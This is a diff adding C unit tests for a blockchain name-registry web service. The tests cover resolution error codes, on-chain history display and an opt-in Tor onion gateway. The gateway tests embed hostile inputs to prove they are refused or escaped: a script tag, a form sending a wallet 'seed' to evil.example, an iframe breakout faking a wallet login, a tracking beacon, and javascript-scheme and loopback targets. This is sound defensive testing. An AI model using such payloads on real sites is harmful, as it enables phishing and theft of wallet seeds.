@@ -7,6 +7,12 @@
  *   - register POST refusals (missing CSRF, missing PoW)
  *   - the name-bound proof-of-work gate (verify + single-use replay refusal)
  *   - the name_records relationship RPC
+ *   - the resolution ERROR TAXONOMY: absent vs malformed vs
+ *     registered-but-no-such-target must never collapse into one answer
+ *     (docs/spec/power-node-contract.md), at the resolver AND on HTTP
+ *   - the on-chain history presentation (registered/changed heights + txids)
+ *   - the onion GATEWAY: off by default, hostile-hostname refusal, the
+ *     hard size cap, and that relayed bytes are rendered inert
  *
  * Model validation, projection fold (register→update→transfer→renew→expire),
  * and rebuild-from-scratch idempotence are covered by test_znam.c /
@@ -16,6 +22,9 @@
 #include "test/test_core.h"
 #include "controllers/name_site_controller.h"
 #include "controllers/name_controller.h"
+#include "controllers/name_resolver.h"
+#include "controllers/name_gateway_controller.h"
+#include "views/name_gateway_view.h"
 #include "models/znam.h"
 #include "models/database.h"
 #include "rpc/server.h"
@@ -144,18 +153,555 @@ static int t_resolution_precedence(void)
     TS_CHECK("profile shows owner",
              strstr((char *)resp, "t1Ownerprofonly") != NULL);
 
-    /* unknown name → 404 */
+    /* unknown name → 404 ABSENT */
     nb = name_site_handle_request("GET", "/n/ghost", NULL, 0, resp, sizeof(resp));
     resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
     TS_CHECK("unknown -> 404", strstr((char *)resp, "404 Not Found") != NULL);
 
-    /* invalid name (uppercase) → 404, never a resolution */
+    /* invalid name (uppercase) → 400 MALFORMED, never a resolution and
+     * never the same answer as "absent". */
     nb = name_site_handle_request("GET", "/n/BadName", NULL, 0, resp, sizeof(resp));
     resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
-    TS_CHECK("invalid name -> 404", strstr((char *)resp, "404 Not Found") != NULL);
+    TS_CHECK("invalid name -> 400", strstr((char *)resp, "400 Bad Request") != NULL);
 
     rpc_name_set_state(NULL);
     sqlite3_close(db);
+    return failures;
+}
+
+/* ── Error taxonomy ─────────────────────────────────────────────────
+ *
+ * docs/spec/power-node-contract.md: "Resolution APIs must distinguish
+ * absent names, malformed names, and records that exist but lack the
+ * requested target type." Three inputs, three verdicts, three HTTP
+ * statuses, three machine codes — and none of them equal to another. */
+static int t_error_taxonomy(void)
+{
+    int failures = 0;
+    sqlite3 *db = NULL;
+    struct node_db ndb;
+    struct name_resolution res;
+    if (!open_site_db(&db, &ndb)) return 1;
+    rpc_name_set_state(&ndb);
+
+    seed_name(&ndb, "payonly", ZNAM_TYPE_TADDR, "t1PayOnly");
+    db_znam_addr_save(&ndb, "payonly", ZNAM_TYPE_BTC, "bc1qpay");
+
+    /* ── resolver level ── */
+    TS_CHECK("malformed (uppercase)",
+             name_resolve(&ndb, "BadName", 0, &res) == NAME_RESOLVE_MALFORMED);
+    TS_CHECK("malformed (empty)",
+             name_resolve(&ndb, "", 0, &res) == NAME_RESOLVE_MALFORMED);
+    TS_CHECK("malformed (NULL)",
+             name_resolve(&ndb, NULL, 0, &res) == NAME_RESOLVE_MALFORMED);
+    TS_CHECK("malformed does not look anything up", !res.have_entry);
+
+    TS_CHECK("absent",
+             name_resolve(&ndb, "nosuchname", 0, &res) == NAME_RESOLVE_ABSENT);
+    TS_CHECK("absent has no entry", !res.have_entry);
+
+    TS_CHECK("wrong target type",
+             name_resolve(&ndb, "payonly", ZNAM_TYPE_ONION, &res)
+                 == NAME_RESOLVE_NO_SUCH_TARGET);
+    /* The distinguishing fact: unlike ABSENT, this name HAS an owner, so
+     * the caller is told who to ask. */
+    TS_CHECK("wrong-target keeps the entry", res.have_entry);
+    TS_CHECK("wrong-target names the owner",
+             strcmp(res.entry.owner_address, "t1Ownerpayonly") == 0);
+
+    TS_CHECK("right target type resolves",
+             name_resolve(&ndb, "payonly", ZNAM_TYPE_TADDR, &res)
+                 == NAME_RESOLVE_OK);
+    TS_CHECK("secondary address record resolves",
+             name_resolve(&ndb, "payonly", ZNAM_TYPE_BTC, &res)
+                 == NAME_RESOLVE_OK);
+    TS_CHECK("secondary record value", strcmp(res.value, "bc1qpay") == 0);
+
+    TS_CHECK("registry unavailable is not 'absent'",
+             name_resolve(NULL, "payonly", 0, &res)
+                 == NAME_RESOLVE_REGISTRY_UNAVAILABLE);
+
+    /* The three codes are distinct strings, not three spellings of one. */
+    TS_CHECK("codes distinct: malformed vs absent",
+             strcmp(name_resolve_status_code(NAME_RESOLVE_MALFORMED),
+                    name_resolve_status_code(NAME_RESOLVE_ABSENT)) != 0);
+    TS_CHECK("codes distinct: absent vs no-such-target",
+             strcmp(name_resolve_status_code(NAME_RESOLVE_ABSENT),
+                    name_resolve_status_code(NAME_RESOLVE_NO_SUCH_TARGET)) != 0);
+    TS_CHECK("messages distinct: absent vs no-such-target",
+             strcmp(name_resolve_status_message(NAME_RESOLVE_ABSENT),
+                    name_resolve_status_message(NAME_RESOLVE_NO_SUCH_TARGET)) != 0);
+    TS_CHECK("malformed is a 400",
+             strcmp(name_resolve_status_http(NAME_RESOLVE_MALFORMED),
+                    "400 Bad Request") == 0);
+    TS_CHECK("registry-unavailable is a 503",
+             strcmp(name_resolve_status_http(NAME_RESOLVE_REGISTRY_UNAVAILABLE),
+                    "503 Service Unavailable") == 0);
+
+    /* ── HTTP surface ── */
+    uint8_t resp[65536];
+    size_t nb;
+
+    nb = name_site_handle_request("GET", "/n/BadName", NULL, 0, resp, sizeof(resp));
+    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
+    TS_CHECK("http malformed status",
+             strstr((char *)resp, "400 Bad Request") != NULL);
+    TS_CHECK("http malformed code header",
+             strstr((char *)resp, "X-ZCL-Name-Error: NAME_MALFORMED") != NULL);
+
+    nb = name_site_handle_request("GET", "/n/nosuchname", NULL, 0, resp, sizeof(resp));
+    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
+    TS_CHECK("http absent status", strstr((char *)resp, "404 Not Found") != NULL);
+    TS_CHECK("http absent code header",
+             strstr((char *)resp, "X-ZCL-Name-Error: NAME_ABSENT") != NULL);
+
+    nb = name_site_handle_request("GET", "/n/payonly?type=onion", NULL, 0,
+                                  resp, sizeof(resp));
+    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
+    TS_CHECK("http wrong-target code header",
+             strstr((char *)resp, "X-ZCL-Name-Error: NAME_NO_SUCH_TARGET")
+                 != NULL);
+    TS_CHECK("http wrong-target names the owner",
+             strstr((char *)resp, "t1Ownerpayonly") != NULL);
+    TS_CHECK("http wrong-target is not the absent page",
+             strstr((char *)resp, "NAME_ABSENT") == NULL);
+
+    nb = name_site_handle_request("GET", "/n/payonly?type=wombat", NULL, 0,
+                                  resp, sizeof(resp));
+    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
+    TS_CHECK("http unknown type code header",
+             strstr((char *)resp, "X-ZCL-Name-Error: NAME_TYPE_UNKNOWN")
+                 != NULL);
+
+    /* A constrained lookup that DOES resolve is a normal page. */
+    nb = name_site_handle_request("GET", "/n/payonly?type=btc", NULL, 0,
+                                  resp, sizeof(resp));
+    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
+    TS_CHECK("http right-type resolves 200",
+             strstr((char *)resp, "200 OK") != NULL);
+
+    /* /names/<name> carries the same taxonomy, not a second dialect. */
+    nb = name_site_handle_request("GET", "/names/BadName", NULL, 0,
+                                  resp, sizeof(resp));
+    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
+    TS_CHECK("/names malformed code header",
+             strstr((char *)resp, "X-ZCL-Name-Error: NAME_MALFORMED") != NULL);
+
+    /* No registry wired at all is a 503, never a 404 — "we cannot look"
+     * is not "it is not there". */
+    rpc_name_set_state(NULL);
+    nb = name_site_handle_request("GET", "/n/payonly", NULL, 0,
+                                  resp, sizeof(resp));
+    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
+    TS_CHECK("http registry-unavailable is 503",
+             strstr((char *)resp, "503 Service Unavailable") != NULL);
+    TS_CHECK("http registry-unavailable code header",
+             strstr((char *)resp, "X-ZCL-Name-Error: NAME_REGISTRY_UNAVAILABLE")
+                 != NULL);
+
+    sqlite3_close(db);
+    return failures;
+}
+
+/* ── name_resolve RPC taxonomy ──────────────────────────────────── */
+static int t_resolve_rpc_taxonomy(void)
+{
+    int failures = 0;
+    sqlite3 *db = NULL;
+    struct node_db ndb;
+    struct rpc_table t;
+    if (!open_site_db(&db, &ndb)) return 1;
+    rpc_name_set_state(&ndb);
+    rpc_table_init(&t);
+    register_name_rpc_commands(&t);
+
+    seed_name(&ndb, "rpconly", ZNAM_TYPE_TADDR, "t1Rpc");
+
+    const struct rpc_command *cmd = rpc_table_find(&t, "name_resolve");
+    TS_CHECK("name_resolve registered", cmd != NULL);
+
+    static const struct { const char *name; const char *type; const char *code; }
+        cases[] = {
+        { "BadName",  NULL,      "NAME_MALFORMED" },
+        { "ghostname", NULL,     "NAME_ABSENT" },
+        { "rpconly",  "onion",   "NAME_NO_SUCH_TARGET" },
+        { "rpconly",  "wombat",  "NAME_TYPE_UNKNOWN" },
+    };
+
+    for (size_t i = 0; cmd && i < sizeof(cases) / sizeof(cases[0]); i++) {
+        struct json_value params = {0}, arg = {0}, targ = {0}, result = {0};
+        json_set_array(&params);
+        json_set_str(&arg, cases[i].name);
+        json_push_back(&params, &arg);
+        json_free(&arg);
+        if (cases[i].type) {
+            json_set_str(&targ, cases[i].type);
+            json_push_back(&params, &targ);
+            json_free(&targ);
+        }
+        bool ok = cmd->actor(&params, false, &result);
+        const char *code = json_get_str(json_get(&result, "error_code"));
+        TS_CHECK("resolve rpc answered", ok);
+        TS_CHECK("resolve rpc taxonomy code",
+                 code && strcmp(code, cases[i].code) == 0);
+        TS_CHECK("resolve rpc says not resolved",
+                 json_get(&result, "resolved") &&
+                 !json_get_bool(json_get(&result, "resolved")));
+        json_free(&params);
+        json_free(&result);
+    }
+
+    /* Success still carries the record AND names what it resolved to. */
+    if (cmd) {
+        struct json_value params = {0}, arg = {0}, result = {0};
+        json_set_array(&params);
+        json_set_str(&arg, "rpconly");
+        json_push_back(&params, &arg);
+        json_free(&arg);
+        bool ok = cmd->actor(&params, false, &result);
+        const char *val = json_get_str(json_get(&result, "resolved_value"));
+        TS_CHECK("resolve rpc ok", ok);
+        TS_CHECK("resolve rpc resolved flag",
+                 json_get_bool(json_get(&result, "resolved")));
+        TS_CHECK("resolve rpc value", val && strcmp(val, "t1Rpc") == 0);
+        TS_CHECK("resolve rpc carries history",
+                 json_get(&result, "history") != NULL);
+        json_free(&params);
+        json_free(&result);
+    }
+
+    rpc_name_set_state(NULL);
+    sqlite3_close(db);
+    return failures;
+}
+
+/* ── On-chain history presentation ──────────────────────────────── */
+static int t_history_presentation(void)
+{
+    int failures = 0;
+    sqlite3 *db = NULL;
+    struct node_db ndb;
+    struct name_history h;
+    if (!open_site_db(&db, &ndb)) return 1;
+    rpc_name_set_state(&ndb);
+
+    /* Never changed: reg_txid == last_update_txid (what seed_name writes). */
+    seed_name(&ndb, "steady", ZNAM_TYPE_TADDR, "t1Steady");
+    struct znam_entry e;
+    TS_CHECK("load steady", db_znam_find(&ndb, "steady", &e));
+    name_history_load(&ndb, &e, &h);
+    TS_CHECK("steady not changed", !h.changed);
+    TS_CHECK("steady change height == reg height",
+             h.last_change_height == e.reg_height);
+    TS_CHECK("steady reg height", h.reg_height == 100);
+    TS_CHECK("steady expiry carried", h.expiry_height == 210340);
+
+    /* Changed: a different last_update_txid, and no tx index in this
+     * fixture — the height must come back UNKNOWN (-1), never guessed. */
+    struct znam_entry c;
+    memset(&c, 0, sizeof(c));
+    snprintf(c.name, sizeof(c.name), "%s", "moved");
+    snprintf(c.owner_address, sizeof(c.owner_address), "%s", "t1OwnerMoved");
+    c.target_type = ZNAM_TYPE_ONION;
+    snprintf(c.target_value, sizeof(c.target_value), "%s", "moved.onion");
+    memset(c.reg_txid, 0x11, 32);
+    memset(c.last_update_txid, 0x22, 32);
+    c.reg_height = 500;
+    c.expiry_height = 610340;
+    TS_CHECK("save moved", db_znam_save(&ndb, &c));
+    name_history_load(&ndb, &c, &h);
+    TS_CHECK("moved is changed", h.changed);
+    TS_CHECK("moved height unknown, not guessed", h.last_change_height == -1);
+    TS_CHECK("moved reg txid rendered",
+             strncmp(h.reg_txid_hex, "1111", 4) == 0);
+    TS_CHECK("moved change txid rendered",
+             strncmp(h.last_change_txid_hex, "2222", 4) == 0);
+
+    /* The profile page shows it — this is the whole point of the item:
+     * the data existed, the presentation did not. */
+    uint8_t resp[65536];
+    size_t nb = name_site_handle_request("GET", "/names/moved", NULL, 0,
+                                         resp, sizeof(resp));
+    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
+    TS_CHECK("profile has history card",
+             strstr((char *)resp, "On-chain history") != NULL);
+    TS_CHECK("profile shows registration height",
+             strstr((char *)resp, "block 500") != NULL);
+    TS_CHECK("profile links the registration tx",
+             strstr((char *)resp, "/explorer/tx/1111") != NULL);
+    TS_CHECK("profile links the change tx",
+             strstr((char *)resp, "/explorer/tx/2222") != NULL);
+    TS_CHECK("profile does not invent a change height",
+             strstr((char *)resp, "height not known to this node") != NULL);
+    TS_CHECK("profile makes the CA argument",
+             strstr((char *)resp, "certificate authority") != NULL);
+
+    nb = name_site_handle_request("GET", "/names/steady", NULL, 0,
+                                  resp, sizeof(resp));
+    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
+    TS_CHECK("unchanged name says so",
+             strstr((char *)resp, "none &mdash; the registration") != NULL ||
+             strstr((char *)resp, "none — the registration") != NULL);
+
+    rpc_name_set_state(NULL);
+    sqlite3_close(db);
+    return failures;
+}
+
+/* ── Onion gateway ──────────────────────────────────────────────── */
+
+/* A syntactically exact Tor v3 hostname: 56 chars of [a-z2-7] + ".onion". */
+#define GW_GOOD_HOST \
+    "abcdefghijklmnopqrstuvwxyz234567abcdefghijklmnopqrstuvwx.onion"
+
+static int t_gateway_off_by_default(void)
+{
+    int failures = 0;
+    sqlite3 *db = NULL;
+    struct node_db ndb;
+    if (!open_site_db(&db, &ndb)) return 1;
+    rpc_name_set_state(&ndb);
+
+    unsetenv("ZCL_NAMES_ONION_GATEWAY");
+    TS_CHECK("gateway off by default", !name_gateway_enabled());
+
+    /* Off means nothing is dialled, whatever the target looks like. */
+    struct name_gateway_result *g = malloc(sizeof(*g));
+    TS_CHECK("alloc gateway result", g != NULL);
+    if (g) {
+        TS_CHECK("fetch refuses while disabled",
+                 name_gateway_fetch(GW_GOOD_HOST, g) == NAME_GATEWAY_DISABLED);
+        TS_CHECK("disabled fetch dialled nothing", g->body_len == 0);
+        free(g);
+    }
+
+    /* And /n/<name> keeps the pre-existing 302 exactly. */
+    seed_name(&ndb, "gwname", ZNAM_TYPE_ONION, GW_GOOD_HOST);
+    uint8_t resp[65536];
+    size_t nb = name_site_handle_request("GET", "/n/gwname", NULL, 0,
+                                         resp, sizeof(resp));
+    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
+    TS_CHECK("gateway off -> still a 302",
+             strstr((char *)resp, "302 Found") != NULL);
+    TS_CHECK("gateway off -> Location is the onion",
+             strstr((char *)resp, "Location: http://" GW_GOOD_HOST "/") != NULL);
+
+    rpc_name_set_state(NULL);
+    sqlite3_close(db);
+    return failures;
+}
+
+static int t_gateway_hostname_gate(void)
+{
+    int failures = 0;
+    char host[NAME_GATEWAY_HOST_MAX];
+
+    TS_CHECK("valid v3 host accepted", name_gateway_host_valid(GW_GOOD_HOST));
+    TS_CHECK("NULL host refused", !name_gateway_host_valid(NULL));
+    TS_CHECK("short host refused", !name_gateway_host_valid("abc.onion"));
+    TS_CHECK("v2 host refused",
+             !name_gateway_host_valid("abcdefghijklmnop.onion"));
+    TS_CHECK("non-onion tld refused",
+             !name_gateway_host_valid(
+                 "abcdefghijklmnopqrstuvwxyz234567abcdefghijklmnopqrstuvwx.com"));
+    /* '1', '8', '9', '0' are not in Tor's base32 alphabet. */
+    TS_CHECK("non-base32 char refused",
+             !name_gateway_host_valid(
+                 "1bcdefghijklmnopqrstuvwxyz234567abcdefghijklmnopqrstuvwx.onion"));
+    TS_CHECK("localhost refused", !name_gateway_host_valid("localhost"));
+
+    /* Target → host extraction, the actual hostile-input surface: the
+     * target text is on-chain and attacker-chosen. */
+    TS_CHECK("bare host extracted",
+             name_gateway_host_from_target(GW_GOOD_HOST, host, sizeof(host)) &&
+             strcmp(host, GW_GOOD_HOST) == 0);
+    TS_CHECK("http scheme stripped",
+             name_gateway_host_from_target("http://" GW_GOOD_HOST "/",
+                                           host, sizeof(host)) &&
+             strcmp(host, GW_GOOD_HOST) == 0);
+    TS_CHECK("path and query stripped",
+             name_gateway_host_from_target("https://" GW_GOOD_HOST "/a/b?c=d#e",
+                                           host, sizeof(host)) &&
+             strcmp(host, GW_GOOD_HOST) == 0);
+    TS_CHECK("port 80 tolerated",
+             name_gateway_host_from_target(GW_GOOD_HOST ":80",
+                                           host, sizeof(host)));
+    TS_CHECK("other port refused",
+             !name_gateway_host_from_target(GW_GOOD_HOST ":8080",
+                                            host, sizeof(host)));
+    TS_CHECK("javascript scheme refused",
+             !name_gateway_host_from_target("javascript://" GW_GOOD_HOST,
+                                            host, sizeof(host)));
+    TS_CHECK("userinfo refused",
+             !name_gateway_host_from_target("http://evil@" GW_GOOD_HOST "/",
+                                            host, sizeof(host)));
+    TS_CHECK("clearnet host refused",
+             !name_gateway_host_from_target("http://example.com/",
+                                            host, sizeof(host)));
+    TS_CHECK("loopback refused",
+             !name_gateway_host_from_target("http://127.0.0.1:80/",
+                                            host, sizeof(host)));
+    TS_CHECK("empty target refused",
+             !name_gateway_host_from_target("", host, sizeof(host)));
+    TS_CHECK("refusal clears the output", host[0] == '\0');
+
+    /* Case folding: hostnames are case-insensitive, onion base32 is not
+     * uppercase — fold, then validate; never dial an unvalidated string. */
+    TS_CHECK("uppercase host folded",
+             name_gateway_host_from_target("HTTP://ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+                                           "234567ABCDEFGHIJKLMNOPQRSTUVWX"
+                                           ".ONION/", host, sizeof(host)) &&
+             strcmp(host, GW_GOOD_HOST) == 0);
+    return failures;
+}
+
+static int t_gateway_enabled_paths(void)
+{
+    int failures = 0;
+    sqlite3 *db = NULL;
+    struct node_db ndb;
+    if (!open_site_db(&db, &ndb)) return 1;
+    rpc_name_set_state(&ndb);
+
+    setenv("ZCL_NAMES_ONION_GATEWAY", "1", 1);
+    TS_CHECK("gateway opt-in read", name_gateway_enabled());
+
+    uint8_t resp[65536];
+    size_t nb;
+
+    /* A registered target that is NOT an exact v3 onion is refused before
+     * anything is dialled — and the visitor is told which rule refused it. */
+    seed_name(&ndb, "badtarget", ZNAM_TYPE_ONION, "aaaa.onion");
+    nb = name_site_handle_request("GET", "/n/badtarget", NULL, 0,
+                                  resp, sizeof(resp));
+    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
+    TS_CHECK("bad target -> 400", strstr((char *)resp, "400 Bad Request") != NULL);
+    TS_CHECK("bad target names the rule",
+             strstr((char *)resp, "GATEWAY_BAD_HOST") != NULL);
+    TS_CHECK("bad target is not a redirect",
+             strstr((char *)resp, "302 Found") == NULL);
+
+    /* A well-formed target with Tor not running: the name still resolved,
+     * so the page must say so and hand over the direct link rather than
+     * pretending the name is broken. */
+    seed_name(&ndb, "goodtarget", ZNAM_TYPE_ONION, GW_GOOD_HOST);
+    nb = name_site_handle_request("GET", "/n/goodtarget", NULL, 0,
+                                  resp, sizeof(resp));
+    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
+    TS_CHECK("tor down -> 502", strstr((char *)resp, "502 Bad Gateway") != NULL);
+    TS_CHECK("tor down names the reason",
+             strstr((char *)resp, "GATEWAY_TOR_UNAVAILABLE") != NULL);
+    TS_CHECK("tor down still offers the direct link",
+             strstr((char *)resp, "http://" GW_GOOD_HOST "/") != NULL);
+
+    /* No credential-bearing header is ever emitted by this surface. */
+    TS_CHECK("no cookie header on the gateway response",
+             strstr((char *)resp, "Set-Cookie") == NULL);
+    TS_CHECK("relay response is uncached",
+             strstr((char *)resp, "Cache-Control: no-store") != NULL);
+
+    unsetenv("ZCL_NAMES_ONION_GATEWAY");
+    rpc_name_set_state(NULL);
+    sqlite3_close(db);
+    return failures;
+}
+
+/* Everything the far side sends is hostile. Prove it is rendered inert and
+ * cannot reach this node's own page context. */
+static int t_gateway_relay_is_inert(void)
+{
+    int failures = 0;
+    static uint8_t resp[262144];
+    const char *hostile =
+        "<script>alert('pwn')</script>"
+        "<form action='http://evil.example/steal'>"
+        "<input name='seed'></form>"
+        "\"></iframe><h1>ZClassic23 wallet login</h1><iframe srcdoc=\""
+        "<img src='http://evil.example/beacon.png'>";
+    size_t nb = name_gateway_view_page("relayed", GW_GOOD_HOST,
+                                       (const uint8_t *)hostile,
+                                       strlen(hostile), 200, false,
+                                       strlen(hostile), resp, sizeof(resp));
+    TS_CHECK("relay page rendered", nb > 0 && nb < sizeof(resp));
+    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
+
+    /* The frame is sandboxed with NO allow-* token: opaque origin, no
+     * scripts, no forms, no top-level navigation. */
+    TS_CHECK("frame is sandboxed", strstr((char *)resp, "sandbox=''") != NULL);
+    TS_CHECK("no sandbox escape hatch",
+             strstr((char *)resp, "allow-scripts") == NULL &&
+             strstr((char *)resp, "allow-same-origin") == NULL &&
+             strstr((char *)resp, "allow-forms") == NULL);
+    TS_CHECK("CSP present",
+             strstr((char *)resp, "Content-Security-Policy: default-src 'none'")
+                 != NULL);
+    TS_CHECK("nosniff present",
+             strstr((char *)resp, "X-Content-Type-Options: nosniff") != NULL);
+    TS_CHECK("no referrer leaked upstream",
+             strstr((char *)resp, "Referrer-Policy: no-referrer") != NULL);
+
+    /* Not one hostile construct survives as live markup. */
+    TS_CHECK("script tag escaped",
+             strstr((char *)resp, "<script>alert") == NULL &&
+             strstr((char *)resp, "&lt;script&gt;alert") != NULL);
+    TS_CHECK("form tag escaped",
+             strstr((char *)resp, "<form action=") == NULL);
+    TS_CHECK("img tag escaped", strstr((char *)resp, "<img src=") == NULL);
+    /* The srcdoc-breakout attempt: the quote must be an entity, so the
+     * parent parser never leaves the attribute and the fake login header
+     * cannot become this node's own chrome. */
+    TS_CHECK("srcdoc breakout escaped",
+             strstr((char *)resp, "\"></iframe><h1>") == NULL &&
+             strstr((char *)resp, "&quot;&gt;&lt;/iframe&gt;") != NULL);
+    /* The banner is outside the frame and states the relationship. */
+    TS_CHECK("relay banner present",
+             strstr((char *)resp, "does not vouch for it") != NULL);
+    TS_CHECK("relay marked in the headers",
+             strstr((char *)resp, "X-ZCL-Relay:") != NULL);
+    return failures;
+}
+
+/* The caps are hard, and they are reported rather than hidden. */
+static int t_gateway_caps(void)
+{
+    int failures = 0;
+    static uint8_t resp[262144];
+    static uint8_t big[NAME_GATEWAY_MAX_BODY_BYTES];
+
+    TS_CHECK("body cap is bounded",
+             NAME_GATEWAY_MAX_BODY_BYTES > 0 &&
+             NAME_GATEWAY_MAX_BODY_BYTES <= 64u * 1024u);
+    TS_CHECK("timeout cap is bounded",
+             NAME_GATEWAY_TIMEOUT_SECS > 0 && NAME_GATEWAY_TIMEOUT_SECS <= 30);
+
+    memset(big, 'A', sizeof(big));
+
+    /* Truncation by the fetch cap is stated on the page, not swallowed. */
+    size_t nb = name_gateway_view_page("relayed", GW_GOOD_HOST, big,
+                                       sizeof(big), 200, true,
+                                       sizeof(big) * 4, resp, sizeof(resp));
+    TS_CHECK("capped page rendered", nb > 0 && nb <= sizeof(resp));
+    resp[nb < sizeof(resp) ? nb : sizeof(resp) - 1] = '\0';
+    TS_CHECK("truncation is disclosed",
+             strstr((char *)resp, "cut short") != NULL);
+
+    /* A response buffer smaller than the body must still produce a
+     * self-consistent response — never a Content-Length that lies. */
+    static uint8_t small[8192];
+    nb = name_gateway_view_page("relayed", GW_GOOD_HOST, big, sizeof(big),
+                                200, false, sizeof(big), small, sizeof(small));
+    TS_CHECK("small buffer respected", nb <= sizeof(small));
+    if (nb > 0) {
+        small[sizeof(small) - 1] = '\0';
+        const char *cl = strstr((char *)small, "Content-Length: ");
+        const char *hdr_end = strstr((char *)small, "\r\n\r\n");
+        TS_CHECK("small response has a length", cl != NULL && hdr_end != NULL);
+        if (cl && hdr_end) {
+            size_t declared = (size_t)strtoul(cl + 16, NULL, 10);
+            size_t actual = nb - (size_t)((hdr_end + 4) - (const char *)small);
+            TS_CHECK("Content-Length matches the body", declared == actual);
+        }
+    }
     return failures;
 }
 
@@ -353,6 +899,14 @@ int test_znam_site(void)
     failures += t_register_refusals();
     failures += t_pow_gate_single_use();
     failures += t_name_records_rpc();
+    failures += t_error_taxonomy();
+    failures += t_resolve_rpc_taxonomy();
+    failures += t_history_presentation();
+    failures += t_gateway_off_by_default();
+    failures += t_gateway_hostname_gate();
+    failures += t_gateway_enabled_paths();
+    failures += t_gateway_relay_is_inert();
+    failures += t_gateway_caps();
     printf("znam_site: %d failures\n", failures);
     return failures;
 }
